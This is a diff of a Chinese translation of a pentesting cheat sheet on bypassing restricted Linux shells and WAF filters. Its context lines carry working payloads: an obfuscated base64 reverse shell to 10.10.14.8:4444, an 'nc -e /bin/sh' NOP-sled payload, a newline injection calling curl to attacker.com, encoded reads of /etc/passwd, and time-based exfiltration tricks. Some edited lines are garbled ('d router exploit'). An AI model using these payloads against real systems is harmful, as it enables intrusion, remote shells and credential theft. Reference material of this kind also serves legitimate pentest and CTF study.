@@ -1,8 +1,10 @@
 # 绕过 Linux 限制
 
+{{#include ../../../banners/hacktricks-training.md}}
+
 ## 常见限制绕过
 
-PayloadsAllTheThings、Bo0oM 的 cheat sheet 以及两个链接的 Secjuice 文章中的 command-injection 和 WAF-evasion 集合，为本节中的 shell-syntax 变体提供了背景资料。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+PayloadsAllTheThings、Bo0oM 的 cheat sheet 以及两个链接的 Secjuice 文章中的命令注入和 WAF-evasion 集合，为本节中的 shell 语法变体提供了背景知识。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -10,7 +12,7 @@ PayloadsAllTheThings、Bo0oM 的 cheat sheet 以及两个链接的 Secjuice 文�
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### 简短 Rev shell
+### Short Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -110,7 +112,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass pipes
+### 绕过管道
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -124,12 +126,12 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### 绕过 IP 限制
+### 绕过 IP 地址
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### 基于时间的数据窃取
+### 基于时间的数据外泄
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -138,14 +140,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS 数据外泄
+### DNS data exfiltration
 
-对于 out-of-band callbacks，类似 Burp Collaborator 的 collaborator-style service 可以诱导目标应用与外部服务器进行交互；现有的 [**pingb**](http://pingb.in) link 作为历史导航保留，并不代表其当前可用性声明。<sup>[[6]](#references)</sup>
+对于 out-of-band callbacks，类似 Burp Collaborator 的 collaborator-style service 可以诱使目标应用与外部服务器交互；现有的 [**pingb**](http://pingb.in) 链接保留为历史导航，不代表其当前可用性声明。<sup>[[6]](#references)</sup>
 
 ### 内置命令
 
-在受限 shell 中，可用的 builtins 是这些示例中剩余的命令面；Bash 对其 builtin commands 和执行语法进行了说明。<sup>[[7]](#references)</sup>思路来源于 [**devploit**](https://twitter.com/devploit)。\
-从现有的 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 导航开始，然后尝试以下 Bash-specific techniques：<sup>[[7]](#references)</sup>
+在受限 shell 中，可用的 builtins 是这些示例剩余的命令接口；Bash 对其 builtin commands 和执行语法进行了说明。<sup>[[7]](#references)</sup>思路来自 [**devploit**](https://twitter.com/devploit)。\
+先从现有的 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 导航开始，然后尝试以下 Bash-specific techniques：<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,21 +204,21 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### 绕过潜在的正则表达式
+### 绕过可能存在的正则表达式
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-以下调用使用 Bashfuscator，这是一个开源的 Bash 混淆框架；代码注释中的 repository link 保留不变，便于导航。<sup>[[8]](#references)</sup>
+以下调用使用 Bashfuscator，这是一个开源的 Bash 混淆框架；代码注释中的 repository link 保留用于导航。<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### 使用 5 个字符实现 RCE
 
-以下两个历史性的 5 字符示例作为挑战复现保留：主要挑战仓库位于 [Orange Tsai 的 repository](https://github.com/orangetw/My-CTF-Web-Challenges)，而代码块中的第二个 write-up 链接用于导航，其当前可用性未经验证。<sup>[[9]](#references)</sup>
+以下两个历史上的 5 字符示例作为挑战复现保留：主要挑战仓库可在 [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges) 中获取，而代码块中的第二个 write-up 链接是用于导航的链接，其当前可用性未经验证。<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -300,7 +302,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-如果你位于具有 **read-only 和 noexec 保护**的 filesystem 中，或处于 **distroless image** 内，环境会施加 Linux `mount(8)` 和 Distroless 项目所记录的执行限制；链接页面汇总了在这些限制下工作的技术。<sup>[[11]](#references)[[12]](#references)</sup>
+如果你位于启用了**只读和 noexec 保护**的文件系统中，或处于 **distroless image** 中，则该环境会施加由 Linux `mount(8)` 和 Distroless project 记录的执行限制；链接页面汇总了在这些限制下工作的技术。<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -314,23 +316,23 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-当某个漏洞允许你部分控制最终传递给 `system()` 或其他 shell 的参数时，payload 的偏移量可能不确定。Alan Cao 和 Will Tan 描述了一种受限 embedded-device 场景：将 shell payload spray 到 memory-mapped NVRAM 中，并在其前面加上空格。<sup>[[5]](#references)</sup>
+当某个漏洞允许你部分控制最终传递给 `system()` 或其他 shell 的参数时，payload 的偏移量可能并不确定。Alan Cao 和 Will Tan 描述了一种受限嵌入式设备场景：将 shell payload spray 到内存映射的 NVRAM 中，并在其前面添加空格。<sup>[[5]](#references)</sup>
 
-因此，你可以通过在真实 command 前添加一长串空格或制表符，创建一个 *Bash 的 NOP sled*；Bash 将空格和制表符定义为在 simple command 中分隔单词的空白字符。<sup>[[5]](#references)[[7]](#references)</sup>
+因此，你可以通过在实际命令前添加一长串空格或制表符，创建一个 *Bash 的 NOP sled*；Bash 将空格和制表符定义为在 simple command 中分隔单词的空白字符。<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-如果 ROP chain（或其他 memory-corruption primitive）传递的 command-string pointer 指向 space block 内的任意位置，Bash 就可以解析剩余的前导空格，直到到达 command；在所引用的 router exploit 中，这使不确定的字符串偏移量变得可用。<sup>[[5]](#references)[[7]](#references)</sup>
+如果 ROP chain（或其他 memory-corruption primitive）传递的 command-string pointer 从 space block 内的任意位置开始，Bash 就能解析剩余的前导空格，直到到达 command；在 d router exploit 中，这使不确定的 string offsets 也变得可用。<sup>[[5]](#references)[[7]](#references)</sup>
 
-在受限的 embedded targets 中，实际使用场景包括：<sup>[[5]](#references)</sup>
+在受限嵌入式目标中的实际使用场景包括：<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs**（例如 NVRAM），可供多个进程访问。<sup>[[5]](#references)</sup>
-2. Payload channels，在这些 channel 中，attacker 无法写入 NULL bytes 来对齐 payload（这是对 alignment problem 的一般性适配）。<sup>[[5]](#references)</sup>
-3. 配备小型 BusyBox `ash`/`sh` 环境的 embedded devices；BusyBox 将其记录为 resource-constrained systems 中的 applets。<sup>[[10]](#references)</sup>
+1. **Memory-mapped configuration blobs**（例如 NVRAM），可跨进程访问。<sup>[[5]](#references)</sup>
+2. Payload channels，其中攻击者无法写入 NULL bytes 来对齐 payload（这是对 alignment problem 的一种通用适配）。<sup>[[5]](#references)</sup>
+3. 使用小型 BusyBox `ash`/`sh` 环境的嵌入式设备；BusyBox 将其文档化为 resource-constrained systems 中的 applets。<sup>[[10]](#references)</sup>
 
-> 🛠️ 在受控 lab 中，将此 technique 与调用 `system()` 的 ROP gadgets 结合使用；所引用的 router research 展示了这种组合在 constrained hardware 上的应用。<sup>[[5]](#references)</sup>
+> 🛠️ 在受控实验室中，将此 technique 与调用 `system()` 的 ROP gadgets 结合使用；d router research 展示了这种组合在受限硬件上的应用。<sup>[[5]](#references)</sup>
 
 ## References
 
@@ -338,7 +340,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao and Will Tan — Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Alan Cao and Will Tan — 利用被遗弃硬件中的 zero days – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
 - [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
